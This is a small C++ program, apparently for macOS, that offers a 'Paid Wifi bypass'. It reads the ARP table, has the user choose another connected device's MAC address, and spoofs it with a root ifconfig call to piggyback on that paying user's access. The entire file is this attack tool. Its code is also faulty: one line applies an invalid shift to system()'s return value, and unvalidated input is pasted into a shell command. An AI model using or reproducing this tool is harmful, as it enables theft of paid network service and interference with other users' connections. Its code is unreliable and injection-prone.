//
//  main.cpp
//  Wifi
//
//  Created by b on 3/29/17.
//  Copyright © 2017 Dev. All rights reserved.
//
#include <unistd.h>
#include <iostream>
#include <string>
#include <stdio.h>


void PaidWifi();

using namespace std;

int main() {
    
    if(getuid()) {
        printf("%s", "Must be ran as root");
        return 1;
    }
    
    int choice;
    //list all options
    printf("1. Paid Wifi bypass\n\nChoose: ");
    
    cin >> choice;
    
    switch(choice){
            
        case 1:
            PaidWifi();
            break;
            
        default:
            break;
    }
    return 0;
}

void PaidWifi() {
    
    string cmd = "sudo ifconfig en1 ether ";
    string realMacAddr;
    system("ifconfig en1 | grep ether") >> realMacAddr;
    char reply;
    cout << "Are you connected to target wifi source? (y/n): ";
    cin >> reply;
    //00:e2:e3:e4:e5:e6
    if(tolower(reply) == 'y'){
        cout << "[+] NOTE: Only works if another real user is connected\n" << endl
        << "[+] Real users are noted by the mac address format: two characters per colon; I.E: " << endl
        << "a0:3e:9d:05:16:67\n" << endl;
        cout << "Select an address: \n" << endl;
        cout << system("arp -la");
        cout << "\n\nEnter a mac addr: ";
        string macAddr;
        cin >> macAddr;
        cout << "[+] Spoofing mac..." << endl;
        cmd += macAddr;
        system(cmd.c_str());
        printf("%s","[+] Success");
        
    }
    
}
/*
 TODO:
 -SAVE MAC ADDRESS BEFORE SPOOFING
 -COMPARE THE BEFORE AND AFTER MAC ADDRESSES FOR CONFIRMATION
 
 
*/
